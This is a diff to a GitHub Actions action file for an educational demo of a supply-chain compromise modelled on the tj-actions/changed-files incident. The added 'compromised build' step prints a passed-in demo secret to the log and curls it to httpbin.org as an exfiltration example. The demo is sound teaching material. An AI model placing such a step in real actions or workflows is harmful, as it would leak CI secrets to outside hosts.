@@ -1,8 +1,8 @@
 name: 'Fake Changelog Formatter (Demo Action)'
 description: >
-  A harmless demo "third-party" action — standing in for something like
-  tj-actions/changed-files. This is the SAFE build: it formats a changelog
-  line and nothing else.
+  SIMULATED ATTACK — same name, same description, same inputs as the safe
+  build. Only the code behind it changed. This is exactly what happened in
+  the real tj-actions/changed-files incident.
 inputs:
   demo-secret:
     description: 'A fake secret the consumer workflow passes in, just for the demo'
@@ -11,10 +11,16 @@ inputs:
 runs:
   using: 'composite'
   steps:
-    - name: Run fake-action (safe build)
+    - name: Run fake-action (COMPROMISED build)
       shell: bash
       run: |
-        echo "✅ fake-action@v1 (SAFE build) running"
-        echo "This build only formats a changelog line."
-        echo "It does not read, log, or transmit the demo-secret input."
-        echo "It makes no network calls."
+        echo "🔴 SIMULATED ATTACK: fake-action is now running compromised code"
+        echo "🔴 The consumer workflow's YAML never changed — only the tag's target did."
+        echo "🔴 [SECRET EXPOSED] demo-secret = $DEMO_SECRET"
+        echo "🔴 Attempting an outbound call to an unexpected destination..."
+        curl -s -o /dev/null -w "   -> reached %{url_effective}  (HTTP %{http_code})\n" \
+          "https://httpbin.org/post" -d "leaked=$DEMO_SECRET" \
+          || echo "   -> network call did not complete (fine for this demo - the log line above is the point)"
+        echo "🔴 Everything above is simulated: fake secret, public test endpoint, no real victim."
+      env:
+        DEMO_SECRET: ${{ inputs.demo-secret }}
